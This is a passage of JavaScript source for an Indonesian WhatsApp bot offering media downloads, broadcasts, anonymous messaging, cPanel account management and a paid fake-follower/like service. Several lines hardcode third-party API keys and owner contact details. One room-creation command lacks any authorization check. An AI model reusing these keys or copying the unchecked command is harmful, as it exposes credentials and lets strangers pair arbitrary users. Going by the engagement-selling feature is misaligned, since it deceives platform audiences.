          var sdc = await fetchJson(`https://saipulanuar.ga/api/download/soundcloud?url=${yurl}&apikey=jPHjZpQF`)
          console.log(sdc)
          reply(`*SOUNDCLOUD DOWNLOAD*
  
  *author:* Ekuzika OfC
  *title:* ${sdc.result.title}
  *duration:* ${sdc.result.duration}
  *quality:* ${sdc.result.quality}
  
  Audio sedang dikirim...
  
  *Note:*
  jika reply message status undefined
  itu artinya url tidak ditemukan.`)

          conn.sendMessage(from, { audio: { url: sdc.result.download }, mimetype: 'audio/mpeg', fileName: sdc.result.title + '.mp3' }, { quoted: msg })
        } catch (err) {
          reply('Error.')
        }
        break
      case 'playmp4':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        try {
          if (!q) return reply('*Contoh:*\n#playmp4 story wa angel baby 30 detik')
          let play_m = await fetchJson(`https://rest-api-bwb9.onrender.com/api/search/ytplay?text=${q}&apikey=86541bad`)
          let playmp4 = play_m.result
          conn.sendMessage(from, { video: { url: playmp4.mp4.result }, caption: 'Done!' }, { quoted: msg })
        } catch (err) {
          reply(err)
        }
        break
      case 'ytmp3': case 'mp3':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        try {
          if (!q) return reply('*Contoh:*\n#ytmp3 https://youtu.be/MbBGlyAzgz8')
          let mmny = await fetchJson(`https://api.ibeng.tech/api/download/ytmp3?url=${q}&apikey=tamvan`)
          if (mmny.status != true) return reply('Url yang anda masukan tidak valid!')
          var shrturl = await fetchJson(`https://api.akuari.my.id/short/tinyurl?link=${mmny.result.url}`)
          //console.log(mmny.result)
          reply(mess.wait)
          let tymp3 = `                     *YOUTUBE - MP3*

▫ *𝙏𝙞𝙩𝙡𝙚:* ${mmny.result.title}
▫ *𝙑𝙞𝙚𝙬𝙨:* ${mmny.result.view}
▫ *𝘾𝙝𝙖𝙣𝙣𝙚𝙡:* ${mmny.result.channel}
▫ *𝙋𝙪𝙗𝙡𝙞𝙨𝙝𝙚𝙙:*  ${mmny.result.published}
▫ *𝙇𝙞𝙣𝙠:* ${shrturl.hasil}
`
          conn.sendMessage(from, { image: { url: mmny.result.thumb }, caption: tymp3 }, { quoted: msg })
          await sleep(1000)
          conn.sendMessage(from, { audio: { url: mmny.result.url }, mimetype: 'audio/mpeg', fileName: mmny.result.title + '.mp3' }, { quoted: msg })
        } catch (err) {
          reply(err)
        }
        break
      case 'ytmp4': case 'mp4':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        try {
          if (!q) return reply('*Contoh:*\n#ytmp4 https://youtu.be/MbBGlyAzgz8')
          reply(mess.wait)
          let yt_mp4 = await fetchJson(`https://api.ibeng.tech/api/download/ytmp4?url=${q}&apikey=tamvan`)
          if (yt_mp4.status != true) return reply('Link tidak valid!')
          var shrturl = await fetchJson(`https://api.akuari.my.id/short/tinyurl?link=${yt_mp4.result.url}`)
          var btn_mp4 = [
            { buttonId: `!ytmp3 ${q}`, buttonText: { displayText: '⋮☰ PLAY MP3' }, type: 1 },
          ]
          let tymp4 = `                     *YOUTUBE - MP4*

▫ *𝙏𝙞𝙩𝙡𝙚:* ${yt_mp4.result.title}
▫ *𝙑𝙞𝙚𝙬𝙨:* ${yt_mp4.result.view}
▫ *𝘾𝙝𝙖𝙣𝙣𝙚𝙡:* ${yt_mp4.result.channel}
▫ *𝙋𝙪𝙗𝙡𝙞𝙨𝙝𝙚𝙙:*  ${yt_mp4.result.published}
▫ *𝙇𝙞𝙣𝙠:* ${shrturl.hasil}
`
          conn.sendMessage(from, { caption: tymp4, video: { url: yt_mp4.result.url }, buttons: btn_mp4, footer: '© Gurabot - MD' })
        } catch (err) {
          reply('Url yang anda masukan/Rest api mungkin error!')
        }
        break
     case 'mediafire':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply('*Contoh:*\n#mediafire https://www.mediafire.com/file/451l493otr6zca4/V4.zip/file')
        let isLinks = q.match(/(?:https?:\/{2})?(?:w{3}\.)?mediafire(?:com)?\.(?:com|be)(?:\/www\?v=|\/)([^\s&]+)/)
        if (!isLinks) return reply('Link yang kamu berikan tidak valid')
        reply('*Mengunduh Media...*')
        const { mediafireDl } = require('mfiredlcore-vihangayt')
        let baby1 = await mediafireDl(`${q}`)
        console.log(baby1)
        if (baby1.size.split('MB')[0] >= 50) return reply('File Melebihi Batas ' + util.format(baby1))
        let result4 = `-----[ *MEDIAFIRE DOWNLOADER* ]-----

*Name* : ${baby1.name}
*Size* : ${baby1.size}
*Type* : ${baby1.mime}
*Date* : ${baby1.date}

_Wait Mengirim file..._
`
        reply(result4)
        conn.sendMessage(from, { document: { url: baby1.link }, fileName: baby1.name, mimetype: baby1.mime }, { quoted: msg }).catch((err) => reply('Gagal saat mendownload File'))
        break
      case 'grupbot':
      case 'groupbot':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        reply(`${setting.group.judul}
${setting.group.link}`)
        break
      case 'infobot':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        reply(`𝗕𝗢𝗧 𝗜𝗡𝗙𝗢
• Author : @${ownerNumber.split('@')[0]}
• Owner : ${setting.ownerName}
• Botname : ${setting.botName}
• Library : Baileys-MD
• Time : ${jam} WIB
• Date : ${tanggal}
• Terdaftar : ( ${("id", db_user).length} )
• Room Chat : ( ${db_menfes.length} )`)
        break
      case 'ssweb-pc':
      case 'ssweb-hp':
      case 'ssweb': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Masukan parameter url\n*Contoh:*\n${prefix + command} https://google.com`)
        reply(mess.wait)
        let anu = `https://rest-api-bwb9.onrender.com/api/tools/ssweb?link=${q}&apikey=86541bad`
        conn.sendMessage(from, { image: { url: anu }, caption: 'Done!' }, { quoted: msg })
      }
        break
      case 'setfooter':
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Masukan parameter text\n*Contoh:*\n#setfooter ${setting.footer}`)
        setting.footer = q
        fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
        reply('Sukses mengganti footer')
        break
      case 'runtime':
      case 'tes':
      case 'ping':
        //if (!isOwner) return reply(mess.OnlyOwner)
        const timestamp = speed()
        const latensi = speed() - timestamp
        var { upload, download } = await checkBandwidth()
        reply(`*BOT STATUS*\n× *Speed :* ${latensi.toFixed(4)} Second\n× *Runtime :* ${runtime(process.uptime())}\n\n*HOST*\n× *Arch :* ${os.arch()}\n× *CPU :* ${os.cpus()[0].model}${os.cpus().length > 1 ? " (" + os.cpus().length + "x)" : ""}\n× *Platform :* ${os.platform()}\n`)
        break
      case 'rules': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let text_rules = `${rulesBot()}`
        conn.sendMessage(from, { text: text_rules })
      }
        break
      case 'speedtest':
      case 'testspeed': 
      case 'speed': {
        reply('*Testing Speed . . .*')
        let cp = require('child_process')
        let { promisify } = require('util')
        let exec = promisify(cp.exec).bind(cp)
        let o
        try {
          o = await exec('python speed.py')
        } catch (e) {
          o = e
        } finally {
          let { stdout, stderr } = o
          if (stdout.trim()) reply(stdout)
          if (stderr.trim()) reply(stderr)
        }
      }
        break
      case 'user':
      case 'db': {
        if (!isOwner) return reply(mess.OnlyOwner)
        let xx_us = JSON.parse(fs.readFileSync("./database/pengguna.json"));
        let no = 1
        let teks_db = `*INFO-DASHBOARD*

*• Terdaftar :* ( ${("id", db_user).length} )
*• Room Chat :* ( ${db_menfes.length} )\n\n`
        for (let x of xx_us) {
          teks_db += `*User${no++} ${x.name}*\n*ID: @${x.id.split('@')[0]}*\n*Premium: ${x.premium ? 'aktif' : 'tidak'}*\n\n`
        }
        reply(teks_db)
      }
        break
      case 'addprem': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply('*Contoh:*\n#addprem 628xxx')
        var number_one = q + '@s.whatsapp.net'
        if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
        if (cekUser("premium", number_one) == true) return reply('User tersebut sudah premium')
        setUser("±premium", number_one, true)
        reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* aktif`)
        conn.sendMessage(number_one, { text: `Hai kak @${number_one.split("@")[0]}\n*Status Premium:* aktif`, mentions: [number_one] }, { quoted: msg })
      }
        break
      case 'delprem': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply('*Contoh:*\n#delprem 628xxx')
        var number_one = q + '@s.whatsapp.net'
        if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
        if (cekUser("premium", number_one) == false) return reply('User tersebut tidak premium')
        setUser("±premium", number_one, false)
        reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* tidak`)
        conn.sendMessage(number_one, { text: `Hai kak @${number_one.split("@")[0]}\n*Status Premium:* tidak aktif`, mentions: [number_one] }, { quoted: msg })
      }
        break
      case 'owner': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        var owner_Nya = setting.ownerNumber
        sendContact(from, owner_Nya, setting.ownerName, msg)
        sendContact(from, `628889616144@s.whatsapp.net`, `Ekuzika OfC 2`, msg)
        await sleep(1500)
        reply('Chat aja kak, ga usah malu.\nTapi jangan di spam ya!')
      }
        break
      case 'room': {
        if (!isOwner) return reply(mess.OnlyOwner)
        var room = `*CHAT ANONYMOUS*\n\n*TOTAL ROOM : ${anonymous.length}*\n\n`
        var no = 1
        for (let x of anonymous) {
          room += `*ID ROOM ${x.id}*
*CHAT1: @${x.a.split('@')[0]}*
*CHAT2: @${x.b.split('@')[0]}*
*STATUS: ${x.state}*\n\n`
        }
        reply(room)
      }
        break
      case 'daftarprem':
        mentions(`*Ingin Jadi Premium?*
*Silahkan Pilih Waktu Nya*

*List Harga*
Rp5.000 › 5day
Rp10.000 › 10day
Rp15.000 › 15day
Rp20.000 › 20day

*Dan Seterusnya...*
*day › hari*

*Keuntungan Premium*
- _Bisa Add Bot 1 Group_
- _Bisa Gunain Fitur Premium_

*Minat Jadi Premium?*
*Hubungi Owner*
@${setting.ChatOwner.split('@')[0]}`, [setting.ChatOwner])
        break
      case 'sewabot':
        mentions(`*SEWA BOT*

*List Harga*
Rp3.000 › 5day
Rp5.000 › 10day
Rp7.000 › 15day
Rp10.000 › 20day
Rp15.000 › 30day

*day › hari*

*Keuntungan Sewabot*
- _Bisa Add Bot 1 Group_
- _Bisa Gunain Fitur Admin_

*Minat Sewabot?*
*Hubungi Owner*
@${setting.ChatOwner.split('@')[0]}`, [setting.ChatOwner])
        break
      case 'cekprem': {
        mentions(`*CEK PREMIUM*
_• ID : @${cekUser("id", sender).split('@')[0]}_
_• Status : ${cekUser("premium", sender) ? 'Aktif' : 'Tidak'}_`, [sender])
      }
        break
      case 'resetdb': {
        if (!isOwner) return reply(mess.OnlyOwner)
        let para_kos = "[]"
        db_user.splice(para_kos)
        fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user, null, 1))
        await sleep(1000)
        db_menfes.splice(para_kos)
        fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, null, 1))
        reply('Sukses restart database')
      }
        break
      case 'resetlist':
        db_respon_list.splice('[]')
        fs.writeFileSync('./database/db_ListMessage', JSON.stringify(db_respon_list, null, 1))
        reply('Sukses Reset List Message')
        break
      // BROADCAST
      case 'bctext': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix + command} hallo`)
        let db_orang = JSON.parse(fs.readFileSync('./database/pengguna.json'));
        let data_teks = `${q}`
        for (let i of db_orang) {
          var button_broadcast = { text: data_teks, footer: '© broadcast', buttons: [{ buttonId: '!menu', buttonText: { displayText: '⋮☰ 𝗠𝗘𝗡𝗨' }, type: 1 }], headerType: 1 }
          conn.sendMessage(i.id, button_broadcast)
          await sleep(2000)
        }
        reply(`*Sukses mengirim broadcast text ke ${db_orang.length} user*`)
      }
        break
      case 'bcvideo': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (isVideo || isQuotedVideo) {
          var bc_vid = await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/bcvideo.mp4`)
          reply(mess.wait)
          for (let i of db_user) {
            conn.sendMessage(i.id, { video: { url: bc_vid }, caption: '*© broadcast*' })
            await sleep(2000)
          }
          reply(`*Sukses mengirim broadcast video ke ${db_user.length} user*`)
          fs.unlinkSync(bc_vid)
        } else {
          reply(`*kirim video dengan caption ${prefix + command} atau reply video dengan pesan ${prefix + command}*`)
        }
      }
        break
      case 'bcimage': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (isImage || isQuotedImage) {
          var bc_img = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/bcimg.jpg`)
          reply(mess.wait)
          for (let i of db_user) {
            conn.sendMessage(i.id, { image: { url: bc_img }, caption: '*© broadcast*' })
            await sleep(2000)
          }
          reply(`*Sukses mengirim broadcast image ke ${db_user.length} user*`)
          fs.unlinkSync(bc_image)
        } else {
          reply(`*kirim gambar dengan caption ${prefix + command} atau reply gambar dengan pesan ${prefix + command}*`)
        }
      }
        break
      case 'bcaudio': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (isQuotedAudio) {
          var bc_aud = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/bcaudio.mp3`)
          reply(mess.wait)
          for (let i of db_user) {
            conn.sendMessage(i.id, { audio: { url: bc_aud }, mimetype: 'audio/mpeg', fileName: 'bcaudio.mp3' })
            await sleep(2000)
          }
          reply(`*Sukses mengirim broadcast audio ke ${db_user.length} user*`)
          fs.unlinkSync(bc_aud)
        } else {
          reply(`*reply audio dengan pesan ${prefix + command}*`)
        }
      }
        break
      case 'bc':
      case 'siaran':
      case 'broadcast':
        if (!isOwner) return reply(mess.OnlyOwner)
        reply(`*BROADCAST*

*Type Text*
*Example:* 
#bctext <text>

*Type Audio*
*Example:*
#bcaudio <reply audio>

*Type Video*
*Example:*
#bcvideo <reply video>

*Type Image*
*Example:*
#bcimage <reply image>

_Broadcast › Chat All User_`)
        break

      // OWNER ONLY
      case 'setexif':
      case 'setwm': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply('*Contoh:*\n#setwm pack|author')
        let nama_Pack = q.split('|')[0]
        let author_Pack = q.split('|')[1]
        if (!nama_Pack) return reply('*Contoh:*\n#setwm pack|author')
        if (!author_Pack) return reply('*Contoh:*\n#setwm pack|author')
        exif.create(nama_Pack, author_Pack)
        reply('Sukses membuat exif')
      }
        break
      case 'buat_room_chat': {
        var id_satu = q.split('|')[0]
        var id_dua = q.split('|')[1]
        var id_rom = q.split('|')[2]
        db_menfes.push({ "id": id_satu, "teman": id_dua })
        fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, 2, null))
        db_menfes.push({ "id": id_dua, "teman": id_satu })
        fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, 2, null))
        var tulis_pesan = `𝗖𝗵𝗮𝘁 𝗔𝗻𝗼𝗻𝘆𝗺𝗼𝘂𝘀 𝗧𝗲𝗿𝗵𝘂𝗯𝘂𝗻𝗴✓
𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗞𝗶𝗿𝗶𝗺 𝗣𝗲𝘀𝗮𝗻✍

𝗸𝗲𝘁𝗶𝗸 #𝘀𝘁𝗼𝗽𝗰𝗵𝗮𝘁
𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗵𝗮𝗽𝘂𝘀 𝘀𝗲𝘀𝗶 𝗰𝗵𝗮𝘁

𝗡𝗼𝘁𝗲:
𝙧𝙤𝙤𝙢 𝙘𝙝𝙖𝙩 𝙞𝙣𝙞 𝙗𝙚𝙧𝙨𝙞𝙛𝙖𝙩 𝙖𝙣𝙤𝙣𝙞𝙢
𝙟𝙖𝙙𝙞 𝙠𝙖𝙢𝙪 𝙩𝙞𝙙𝙖𝙠 𝙩𝙖𝙪 𝙥𝙖𝙩𝙣𝙚𝙧𝙢𝙪
𝙠𝙚𝙘𝙪𝙖𝙡𝙞 𝙙𝙞𝙖 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 𝙣𝙖𝙢𝙖 𝙖𝙨𝙡𝙞
𝙖𝙩𝙖𝙪 𝙢𝙚𝙢𝙗𝙚𝙧𝙞𝙩𝙖𝙝𝙪𝙠𝙖𝙣 𝙞𝙣𝙛𝙤𝙧𝙢𝙖𝙨𝙞 𝙙𝙖𝙧𝙞𝙣𝙮𝙖.

𝘿𝙞𝙡𝙖𝙧𝙖𝙣𝙜 𝙨𝙥𝙖𝙢/𝙩𝙚𝙡𝙥𝙤𝙣 𝙗𝙤𝙩
𝙎𝙖𝙣𝙠𝙨𝙞 : 𝘽𝙡𝙤𝙠𝙞𝙧 𝙋𝙚𝙧𝙢𝙖𝙣𝙚𝙣

𝗥𝗼𝗼𝗺 𝗜𝗗 : ${id_rom}`
        var buttonMessage = {
          text: tulis_pesan,
          footer: 'klik button untuk menghapus sesi chat',
          buttons: [
            { buttonId: '#stopchat', buttonText: { displayText: '️⋮☰ 𝗦𝗧𝗢𝗣' }, type: 1 }
          ],
          headerType: 1
        }
        conn.sendMessage(id_satu, buttonMessage)
        conn.sendMessage(id_dua, buttonMessage)
      }
        break
      case 'stopchat':
        if (cekPesan("id", sender) == null) return reply(`Kamu sedang tidak didalam roomchat, Silahkan buat room dengan contoh dibawah ini.\n\n*Example:*\n#menfess num|nama|pes\n\n*Contoh:*\n#menfess 628xxx|bot|hai\n\n*Note:*\n6285789004732 - benar (✅)\n+62 857 8900 4732 - salah (❌)`)
        if (isGroup) return reply(mess.OnlyPM)
        var aku = sender
        var dia = cekPesan("teman", aku)
        var teks_aku = `[✓] Berhasil memberhentikan chat`
        setRoom("±id", dia, null)
        setRoom("±teman", dia, null)
        await sleep(2000)
        conn.sendMessage(aku, { text: teks_aku })
        setRoom("±id", aku, null)
        setRoom("±teman", aku, null)
        var teks_dia = `[✓] Room chat telah dihentikan\noleh teman chat kamu👤`
        conn.sendMessage(dia, { text: teks_dia })
        db_menfes.splice('[]')
        fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, null, 1))
        break
      case 'secretchat':
      case 'menfes': case 'menfess': {
        if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat.")
        if (!q) return reply(`Format Fitur Menfess / Kirim pesan rahasia ke seseorang Lewat bot\n\n_*Example*_\n${prefix + command} wa|pengirim|pesan\n\n_*Contoh*_\n${prefix + command} 6285789004732|bot|hai\n\n*Note :*\nBerawal dari 628xxx tanpa spasi`)
        let num = q.split('|')[0]
        let nama_pengirim = q.split('|')[1]
        let pesan_teman = q.split('|')[2]
        var cekap = await conn.onWhatsApp(num + "@s.whatsapp.net")
        if (cekap.length == 0) return reply(`Nomor +${num}\ntidak terdaftar di WhatsApp`)
        let roomC = `#${makeid(10)}`
        if (num == botNumber.split('@')[0]) return reply('Itu kan nomor bot')
        if (num == sender.split('@')[0]) return reply('Menfes ke nomor sendiri:v\ncapek ya? semangat🗿')
        if (!num) return reply(`Harus di isi semua !!\nex : ${prefix + command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
        if (!nama_pengirim) return reply(`Harus di isi semua !!\nex : ${prefix + command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
        if (!pesan_teman) return reply(`Harus di isi semua !!\nex : ${prefix + command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
        let text_menfess = `*ANONYMOUS CHAT*\n_Hallo Kak ${ucapanWaktu}_\n_Ada pesan *Menfess/Rahasia*_\n\n*• Dari :* ${nama_pengirim}\n*• Pesan :* ${pesan_teman}\n\n_Pesan ini ditulis oleh seseorang_\n_Bot hanya menyampaikan saja._`
        let btn_menfes = [{ buttonId: `${prefix}buat_room_chat ${sender}|${num}@s.whatsapp.net|${roomC}`, buttonText: { displayText: '⋮☰ 𝗧𝗘𝗥𝗜𝗠𝗔' }, type: 1 }]
        var button_menfess = {
          text: text_menfess,
          footer: 'Klik button untuk membalas chat.',
          buttons: btn_menfes,
          headerType: 1
        }
        conn.sendMessage(`${num}@s.whatsapp.net`, button_menfess)
        reply('Pesan Menfess kamu sudah dikirim, Sedang menunggu untuk diterima.')
        if (isGroup) return reply("Pesan menfess kamu sudah dikirim.")
      }
        break
      case 'sc': case 'script': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let text_buysc = `*_Mau beli scriptnya? harga murah kok._*

*Contact Person 📞*

*Admin1:*
*Wa.me/628889616144*

*Admin2:*
*Wa.me/6289519009370*

_*Harga Normal :*_ ~Rp120.000~
*_Harga Promo :_ Rp55.000*

_Sudah Termasuk Tutorial_
_Script Sudah Disusun Rapih_
_Size Script Sudah Ringan_
_Anti Ngelag - Anti Delay_
_Anti Spam - Anti Call_
_Total Fitur 500+_
_Topup & Deposit_`
        conn.sendMessage(from, { text: text_buysc }, { quoted: msg })
      }
        break
      case 'request': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix + command} Req fitur antilink bg`)
        var teks = `*| REQUEST FITUR |*`
        var teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
        var teks2 = `\n\nSucces send to owner`
        var bg_lexxy = '628889616144@s.whatsapp.net'
        conn.sendMessage(bg_lexxy, { text: teks + teks1, mentions: [sender] }, { quoted: msg })
        conn.sendMessage(from, { text: teks + teks2 + teks1, mentions: [sender] }, { quoted: msg })
      }
        break
      case 'report': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix + command} Fitur anu error bang`)
        var teks = `*| REPORT FITUR |*`
        var teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
        var teks2 = `\n\nSucces send to owner`
        var bg_lexxy = '628889616144@s.whatsapp.net'
        conn.sendMessage(bg_lexxy, { text: teks + teks1, mentions: [sender] }, { quoted: msg })
        conn.sendMessage(from, { text: teks + teks2 + teks1, mentions: [sender] }, { quoted: msg })
      }
        break
      case 'createcp':
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`*CREATECP ACCOUNT*\nExample:\n#${command} domain|package\n\nContoh:\n#${command} lexxyapi.com|lexxy`)
        let usern = `USER${makeid(6)}`
        let domain = q.split('|')[0]
        let pekeg = q.split('|')[1]
        if (!domain) return reply('Domain wajib di isi!!')
        if (!pekeg) return reply('Package Wajib di isi!!')
        reply('Creating please wait... ⏳')
        axios.get(`https://${hostwhm}:2087/json-api/createacct?api.version=1&username=${usern}&contactemail=lexxyofficial24@gmail.com&plan=${pekeg}&domain=${domain}`, authWhm)
          .then(response => {
            let np = response.data
            if (np.metadata.result == 0) {
              reply(np.metadata.reason)
            } else {
              let dsta = np.metadata.output.raw;
              var substr = dsta.substring(
                dsta.toString().indexOf("+===================================+")
              ); //substr = 'word. Hello!'
              let xxybot = substr.split("| Language: en")[0];
              reply(`${xxybot}\n\nLogin : https://${hostwhm}:2087`)
            }
          });
        break
      case 'listcp':
        if (!isOwner) return reply(mess.OnlyOwner)
        reply('Wait Getting List Account info....')
        axios.get(`https://${hostwhm}:2087/json-api/listaccts?api.version=1`, authWhm)
          .then((risol) => {
            let lisol = risol.data
            var ttdy = lisol.data.acct
            let ogh = `*── 「 LIST CPANEL 」 ──*\nTotal Akun : ${ttdy.length}\n`
            for (let i = 0; i < ttdy.length; i++) {
              ogh += `
\n
─────[\`\`\` ${ttdy[i].user} \`\`\` ]────────
*▢ Maxsub* : ${ttdy[i].maxsub}
*▢ Maxsql* : ${ttdy[i].maxsql}
*▢ Startdate* : ${ttdy[i].startdate}
*▢ Disklimit* : ${ttdy[i].disklimit}
*▢ Maxlst* : ${ttdy[i].maxlst}
*▢ Plan* : ${ttdy[i].plan}
*▢ Owner*: ${ttdy[i].owner}
*▢ IP* : ${ttdy[i].ip}
*▢ Domain* : ${ttdy[i].domain}
*▢ Diskused* : ${ttdy[i].diskused}
*▢ Maxaddons* : ${ttdy[i].maxaddons}
*▢ Suspendreason* : ${ttdy[i].suspendreason}
─────────────────\n\n`
            }
            reply(ogh)
          })
        break
      case 'terminate':
        if (!isOwner) return reply(mess.OnlyOwner)
        if (args.length < 2) return reply(`Kirim perintah #${command} username`)
        reply('Wait Terminating Account....')
        axios
          .get(
            `https://${hostwhm}:2087/json-api/removeacct?api.version=1&username=${args[1]}`, authWhm)
          .then((e) => {
            if ([1, "1"].includes(e.data?.metadata?.result))
              reply(`Done User ${q} Telah di Terminate`);
            else {
              reply(e.metadata);
              console.log(e.data);
            }
          })
        break
      case 'mysesi': case 'sendsesi': case 'session': {
        if (!isOwner) return reply(mess.OnlyOwner)
        reply('please wait..')
        await sleep(3000)

        // Read Database
        var user_bot = await fs.readFileSync('./database/pengguna.json')
        var sesi_bot = await fs.readFileSync(`./${setting.sessionName}.json`)

        // Sending Document
        conn.sendMessage(from, { document: sesi_bot, mimetype: 'document/application', fileName: 'session.json' }, { quoted: msg })
        conn.sendMessage(from, { document: user_bot, mimetype: 'document/application', fileName: 'pengguna.json' }, { quoted: msg })
      }
        break
      // CASE BY LEXXY OFFICIAL
      // JANGAN DI EDIT LAGI YA
      case 'pricelist': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=pricelist&type=semua`)
        if (feta.status == false) return reply(feta.data.msg)
        let list = '*List Harga Layanan*\n\n'
        for (let L of feta.data) {
          list += `name : ${L.nama}\ndesc : ${L.desc}\nmin : ${L.min}\nmax : ${L.max}\nharga : ${L.price}\nid : ${L.id_layanan}\n\n`
        }
        conn.sendMessage(from, { text: list }, { quoted: msg })
      }
        break
      case 'komisi':
        if (!isOwner) return reply(mess.OnlyOwner)
        var komisi = await fetchJson(`http://ampibismm.my.id/api/json?bot=true&action=profile&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop`)
        let reskomisi = `Hallo owner Berikut komisi anda\n*Name :* ${komisi.data.name}\n*Full Name :* ${komisi.data.full_name}\n*Komisi :* ${komisi.data.komisi}`
        conn.sendMessage(from, { text: reskomisi }, { quoted: msg })
        break
      case 'tk': case 'tarikkomisi': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (args.length < 1) return reply('jumlahnya berapa? minimal 10k')
        var fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=listwallet`)
        let list = []
        console.log(fetaa)
        for (let L of fetaa.data) {
          let no = 1
          list.push({
            buttonText: { displayText: L.wallet },
            buttonId: `${prefix}tarikkomisikunci ${q}|${L.wallet}`,
            type: `${no++}`
          })
        }
        let nyobb = list
        conn.sendMessage(from, { text: `*PILLIH E-WALLET*\nPilih jenis wallet yang ingin anda gunakan!`, title: 'WALLET', footer: '©SosmedShop', buttons: nyobb })
      }
        break
      case 'tarikkomisikunci':
        if (!isOwner) return reply(mess.OnlyOwner)
        if (args.length < 1) return m.reply('jumlahnya berapa bang')
        let juml = q.split('|')[0] ? q.split('|')[0] : q
        let walle = q.split('|')[1] ? q.split('|')[1] : ''
        if (walle.length < 1) return reply(`Jumlah dan Target harus di isi!`)
        var tarikom = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=withdraw&amount=${juml}&wallet=${walle}&nomor=${smm_dana_number}&an=${smm_dana_nama}`)
        console.log(tarikom)
        conn.sendMessage(from, { text: `${tarikom.data.msg}` }, { quoted: msg })
        break
      case 'clear':
      case 'clearer':
      case 'clearerr': {
        if (!isOwner) return reply(mess.OnlyOwner)
        server_eror.splice('[]')
        fs.writeFileSync('./database/func_error.json', JSON.stringify(server_eror))
        reply('Done')
      }
        break
      case 'error':
      case 'err': {
        if (!isOwner) return reply(mess.OnlyOwner)
        var teks = `*ERROR SERVER*\n_Total Tercatatat_ : ${server_eror.length}\n\n`
        var NO = 1
        for (let i of server_eror) {
          teks += `=> *ERROR (${NO++})*\n${i.error}\n\n`
        }
        reply(teks)
      }
        break
      case 'order':
      case 'caraorder': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
        let capp = `*Hallo Kak Berikut Cara Order*\n\n*Followers :*\nex1 : _${prefix}followers jumlah|target [ tanpa (@) ]_\nex2 : _${prefix}followers 500|lexxy4554_\n\n*View :*\nex 1 : _${prefix}view jumlah|link_\nex 2 : _${prefix}view 10000|https://vm.tiktok.com/xxxxxxx_\n\n*Like :*\nex 1 : _${prefix}like jumlah|link_\nex 2 : _${prefix}like 10000|https://www.instagram.com/p/xxxxxxx_\n\nSekian penjelasan cara order\nSemoga anda faham dengan penjelasan ini🙏\nbeli = faham`
        conn.sendMessage(from, { text: capp }, { quoted: msg })
      }
        break
      case 'view': case 'like': case 'follower': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
        if (args.length < 1) return reply('Format tidak valid, jika masih belum mengerti ketik *#order*')
        let juma = q.split('|')[0] ? q.split('|')[0] : q
        let targtt = q.split('|')[1] ? q.split('|')[1] : ''
        if (targtt.length < 1) return reply(`Jumlah dan Target harus di isi!\nContoh: ${prefix}${command.slice(1)} 500|lexxy456_`)
        var fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=pricelist&type=${command}`)
        let list = []
        var textplus = `${juma}|${targtt}`
